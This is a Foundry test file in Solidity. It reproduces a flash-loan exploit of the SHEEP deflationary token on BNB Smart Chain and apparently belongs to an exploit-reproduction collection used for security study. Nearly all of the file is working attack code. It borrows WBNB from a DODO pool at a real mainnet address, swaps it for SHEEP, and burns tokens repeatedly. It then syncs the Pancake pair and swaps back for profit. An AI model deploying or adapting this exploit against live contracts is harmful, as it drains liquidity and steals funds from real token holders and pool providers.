// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/interface.sol";

interface ISHEEP is IERC20 {
    function burn(uint256 _value) external;
}

contract ContractTest is Test {
    // DODO Flashloan
    DVM DPPAdvanced = DVM(0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4);
    IPancakeRouter Router =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair Pair =
        IPancakePair(0x912DCfBf1105504fB4FF8ce351BEb4d929cE9c24);
    // Wrapped WBNB
    IERC20 WBNB = IERC20(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    // ERC20 Deflationary Token
    ISHEEP SHEEP = ISHEEP(0x0025B42bfc22CbbA6c02d23d4Ec2aBFcf6E014d4);

    function setUp() public {
        vm.createSelectFork("bsc", 25543755);
        vm.label(address(DPPAdvanced), "DPPAdvanced");
        vm.label(address(Router), "Router");
        vm.label(address(Pair), "Pair");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(SHEEP), "SHEEP");
    }

    function testDeflationaryExploit() public {
        emit log_named_decimal_uint(
            "Exploiter WBNB balance before attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        DPPAdvanced.flashLoan(380 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint(
            "Exploiter WBNB balance after attack",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
    }

    // Flashloan callback function
    function DPPFlashLoanCall(
        address sender,
        uint256 baseAmount,
        uint256 quoteAmount,
        bytes calldata data
    ) external {
        emit log_named_decimal_uint(
            "Flashloaned WBNB amount",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );
        WBNB.approve(address(Router), WBNB.balanceOf(address(this)));
        swapTokens(
            address(WBNB),
            address(SHEEP),
            WBNB.balanceOf(address(this))
        );
        emit log_named_decimal_uint(
            "Exploiter SHEEP balance after swap from WBNB",
            SHEEP.balanceOf(address(this)),
            SHEEP.decimals()
        );

        // Exploitation of deflationary token
        for (uint256 i; i < 105; ++i) {
            uint256 amountToBurn = (SHEEP.balanceOf(address(this)) * 90) / 100;
            SHEEP.burn(amountToBurn);
        }

        Pair.sync();
        emit log_named_decimal_uint(
            "SHEEP balance after burning",
            SHEEP.balanceOf(address(this)),
            SHEEP.decimals()
        );

        SHEEP.approve(address(Router), SHEEP.balanceOf(address(this)));
        swapTokens(
            address(SHEEP),
            address(WBNB),
            SHEEP.balanceOf(address(this))
        );
        emit log_named_decimal_uint(
            "Amount of WBNB after swap from SHEEP",
            WBNB.balanceOf(address(this)),
            WBNB.decimals()
        );

        // Repaying the flashloan
        WBNB.transfer(address(DPPAdvanced), 380 * 1e18);
    }

    // Helper function for swapping tokens
    function swapTokens(
        address from,
        address to,
        uint256 amountToSwap
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(from);
        path[1] = address(to);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
